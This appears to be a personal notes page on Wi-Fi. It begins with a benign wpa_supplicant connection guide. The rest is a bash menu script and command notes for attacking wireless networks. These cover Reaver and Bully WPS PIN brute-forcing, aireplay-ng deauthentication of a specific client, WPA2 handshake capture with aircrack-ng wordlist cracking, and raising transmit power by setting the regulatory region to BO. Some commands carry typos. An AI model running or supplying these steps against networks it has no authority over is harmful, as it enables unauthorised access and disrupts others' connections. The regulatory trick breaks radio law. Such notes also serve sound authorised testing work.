# Wireless

## Wireless - wpa\_supplicant <a id="wireless---wpasupplicant"></a>

So if you manage to disable networkManager you can connect to a wireless network using wpa\_supplicant instead. I think that is what NetworkManager actually uses underneith.

First we need to list all Access Points.

```text
sudo iwlist wlan0 scan
```

Then we need to create a config-file for our specific access-point. We can do that with wpa\_passphrase, after running the command we are asked to write the password, which also gets stored in the config file. In plaintext.

```text
wpa_passphrase NameOfWIfi >  wpa.conf
```

Now we just connect to the AP:

```text
wpa_supplicant -Dwext -iwlan0 -c/etc/wpa_supplicant/wpa.conf
```

After this you do not have an IP-address, or you might not have a updated dhcp lease. So first you need to release the current lease.

```text
sudo dhclient wlan0 -r

# Then get a new dhcp lease
sudo dhclient wlan0
```

Now you should be able to surf the internetz.

`#!/bin/bash`

`#`

`# Collection of wifi tools`

`#`

`clear`

`echo "WiFi tools menu options"`

`echo ""`

`echo "1 . Monitor mode"`

`echo "11. Monitor mode"`

`echo "2 . Airodump-ng"`

`echo "3 . Set Tx power"`

`echo "4 . Reaver"`

`echo "5 . Bully"`

`echo "6 . Wash"`

`echo "7 . 2 Terminal aireplay-ng"`

`echo "8 . Reaver 2 for 2 terminal"`

`echo ""`

`echo "Any key and <enter> for exit"`

`echo ""`

`read -p 'select option: ' choice`

`case $choice in`

`1) # ****** Monitor mode ******`

`ifconfig wlan0 down && echo "wlan0 down"`

`sleep 1`

`echo "Check for interfering processes"`

`airmon-ng check kill`

`sleep 1`

`iwconfig wlan0 mode monitor && echo "monitor mode"`

`sleep 2`

`ifconfig wlan0 up && echo "wlan0 up"`

`sleep 1`

`iwconfig`

`;;`

`11) # ****** Monitor mode ******`

`ip link set wlan0 down && echo "wlan0 down"`

`sleep 1`

`echo "Check for interfering processes"`

`airmon-ng check kill`

`sleep 1`

`iwconfig wlan0 mode monitor && echo "monitor mode"`

`sleep 2`

`ip link set wlan0 up && echo "wlan0 up"`

`sleep 1`

`iwconfig`

`;;`

`2) # ****** AERODUMP-NG *******`

`# #usage: airodump-ng <options><interface>[,<interface>,...]`

`airodump-ng --wps -i wlan0`

`;;`

`3) # ****** TXPOWER*******`

`echo " taking down wlan0"`

`echo ""`

`ifconfig wlan0 down`

`echo " setting region to BO"`

`echo ""`

`iw reg set BO`

`sleep 1`

`iw reg get`

`sleep 1`

`read -p 'Enter power: ' txpower`

`echo "setting txpower to $txpower"`

`echo ""`

`iwconfig wlan0 txpower $txpower`

`sleep 2`

`echo "starting wlan0"`

`echo""`

`ifconfig wlan0 up`

`echo "done"`

`iwconfig`

`;;`

`4) # ****** REAVER ******`

`read -p 'Enter bssid: ' bssid`

`read -p 'Enter channel: ' channel`

`reaver -i wlan0 -b $bsssid -c $channel -vv`

`;;`

`5) # ****** BULLY * *****`

`# bully -e 6F36E6 mon0`

`;;`

`6) # ****** WASH ******`

`wash -i wlan0`

`;;`

`7) # ****** 2 Terminals mode ******`

`read -p 'Enter channel: ' channel`

`iw dev wlan0 set channel $channel`

`sleep 1`

`read -p 'Enter bssid: ' bssid`

`read -p 'Enter essid: ' essid`

`aireplay-ng wlan0 -1 120 -a $bssid #-e $essid`

`;;`

`8) # ****** REAVER 2 ******`

`read -p 'Enter bssid: ' bssid`

`reaver -i wlan0 -A -b $bssid -v --no-nacks`

`;;`

`*)`

`echo "exit"`

`;;`

`esac`

AWUS036ACH

apt-get update

apt install realtek-rtl88xxau-dkms

method1

airmon-ng78:44:76:D6:AF:8C78:44:76:D6:AF:8C

airmon-ng start wlan0

monitor mode is enabled on wlan0mon probably

airmon-ng stop wlan0mon

method2

ifconfig wlan0 down

iwconfig wlan0 mode monitor

ifconfig wlan0 up

method3

ifconfig wlan0 down

airmon-ng check kill

iwconfig wlan0 mode monitor

ifconfig wlan0 up

method4

ip link set wlan0 down

iwconfig wlan0 mode monitor

ip link set wlan0 up

\#check if worked

iwconfig wlan0

ctrl-c for exit screen

Packet sniffing

airodump-ng wlan0mon

Specific target

airodump-ng --wps --channel --bssid 11:22:33:44:55:66 --write filename interface

\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*

wash -i wlan0

reaver -i wlan0 -b 2C:30:33:64:96:1F -c 2 -K 1 -vv

-f = disable channel hopping

a blank string with -p ""

bully -b 1C:3E:84:03:D1:4A -c 6 wlan0

\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*

ifconfig wlan0 down

iw reg set BO

iwconfig wlan0 txpower 30

ifconfig wlan0 up

iwconfig

\*\*\*\*\*\* Get WPA2 handshake \*\*\*\*\*\*

airodump-ng --bssid 78:44:76:D6:AF:8C --channel 1 --write txthandshake wlan0

aireplay-ng --deauth 4 -a 78:44:76:D6:AF:8C -c C4:9A:02:76:45:AD wlan0

\*\*\*\*\*\* Crack with aircrack-ng handshakefile -w wordlist interface

aircrack-ng is-01.cap -w list wlan0

